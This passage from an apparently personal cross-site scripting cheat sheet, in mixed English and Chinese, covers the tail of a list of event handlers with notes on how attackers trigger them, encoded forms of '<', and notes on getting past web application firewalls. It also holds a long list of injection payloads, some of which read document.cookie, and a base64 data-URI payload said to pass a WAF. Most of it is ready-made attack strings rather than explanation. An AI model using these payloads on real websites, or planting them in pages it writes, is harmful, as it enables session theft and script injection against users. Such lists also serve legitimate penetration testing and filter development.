89. `onRowInserted()` (user or attacker would need to insert a row in a data source)
90. `onScroll()` (user would need to scroll, or attacker could use the `scrollBy()` function)
91. `onSeek()` (the onreverse event fires when the timeline is set to play in any direction other than forward)
92. `onSelect()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
93. `onSelectionChange()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
94. `onSelectStart()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
95. `onStart()` (fires at the beginning of each marquee loop)
96. `onStop()` (user would need to press the stop button or leave the webpage)
97. `onStorage()` (storage area changed)
98. `onSyncRestored()` (user interrupts the element’s ability to play its media as defined by the timeline to fire)
99. `onSubmit()` (requires attacker or user submits a form)
100. `onTimeError()` (user or attacker sets a time property, such as dur, to an invalid value)
101. `onTrackChange()` (user or attacker changes track in a playList)
102. `onUndo()` (user went backward in undo transaction history)
103. `onUnload()` (as the user clicks any link or presses the back button or attacker forces a click)
104. `onURLFlip()` (this event fires when an Advanced Streaming Format (ASF) file, played  by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag,  processes script commands embedded in the ASF file)
105. `seekSegmentTime()` (this is a method that locates the specified point on the element’s  segment time line and begins playing from that point. The segment  consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)

#### Character Escape Sequences

> All the possible combinations of the character “<” in HTML and JavaScript. Most of these won’t render out of the box, but many of them can get rendered in certain circumstances as seen above.

    <
    %3C
    &lt
    &lt;
    &LT
    &LT;
    &#60
    &#060
    &#0060
    &#00060
    &#000060
    &#0000060
    &#60;
    &#060;
    &#0060;
    &#00060;
    &#000060;
    &#0000060;
    &#x3c
    &#x03c
    &#x003c
    &#x0003c
    &#x00003c
    &#x000003c
    &#x3c;
    &#x03c;
    &#x003c;
    &#x0003c;
    &#x00003c;
    &#x000003c;
    &#X3c
    &#X03c
    &#X003c
    &#X0003c
    &#X00003c
    &#X000003c
    &#X3c;
    &#X03c;
    &#X003c;
    &#X0003c;
    &#X00003c;
    &#X000003c;
    &#x3C
    &#x03C
    &#x003C
    &#x0003C
    &#x00003C
    &#x000003C
    &#x3C;
    &#x03C;
    &#x003C;
    &#x0003C;
    &#x00003C;
    &#x000003C;
    &#X3C
    &#X03C
    &#X003C
    &#X0003C
    &#X00003C
    &#X000003C
    &#X3C;
    &#X03C;
    &#X003C;
    &#X0003C;
    &#X00003C;
    &#X000003C;
    \x3c
    \x3C
    \u003c
    \u003C


**常用属性：**
  src
  action
  href
  data
  content 
  anytag

  **javascript弹窗函数：**
  alert()
  confirm()
  prompt() 
  write()
  setTimeout()





- ### WAF(⑧懂)

**Stored XSS**

If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.

**Reflected XSS in Javascript**

```
Example: <script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
Exploitation: /?xss=500); alert(document.cookie);//
```

**DOM-based XSS**

```
Example: <script> ... eval($\_GET\[xss\]); ... </script>
Exploitation: /?xss=document.cookie
```

**XSS via request Redirection**

- Vulnerable code:

```
...
header('Location: '.$_GET['param']);
...
```

As well as:

```
..
header('Refresh: 0; URL='.$_GET['param']); 
...
```

- This request will not pass through the WAF:

```
/?param=<javascript:alert(document.cookie>)
```

- This request will pass through the WAF and an XSS attack will be conducted in certain browsers.

```
/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

例：

> - `<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
> - `<Video> <source onerror = "javascript: alert (XSS)">`
> - `<Input value = "XSS" type = text>`
> - `<applet code="javascript:confirm(document.cookie);">`
> - `<isindex x="javascript:" onmouseover="alert(XSS)">`
> - `"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
> - `"><img src="x:x" onerror="alert(XSS)">`
> - `"><iframe src="javascript:alert(XSS)">`
> - `<object data="javascript:alert(XSS)">`
> - `<isindex type=image src=1 onerror=alert(XSS)>`
> - `<img src=x:alert(alt) onerror=eval(src) alt=0>`
> - `<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>`
> - `<iframe/src="data:text/html,<svg onload=alert(1)>">`
> - `<meta content=" 1  ; JAVASCRIPT: alert(1)" http-equiv="refresh"/>`
> - `<svg><script xlink:href=data:,window.open('https://www.google.com/')></script`
> - `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
> - `<iframe src=javascript:alert(document.location)>`
> - `<form><a href="javascript:\u0061lert(1)">X`
> - `</script><img/*%00/src="worksinchrome:prompt(1)"/%00*/onerror='eval(src)'>`
> - `<style>//*{x:expression(alert(/xss/))}//<style></style>`
> - On Mouse Over
> - `<img src="/" =_=" title="onerror='prompt(1)'">`
> - `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=javascript:alert(1)>ClickMe`
> - `<script x> alert(1) </script 1=2`
> - `<form><button formaction=javascript:alert(1)>CLICKME`
> - `<input/onmouseover="javaSCRIPT:confirm(1)"`
> - `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
> - `<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> `













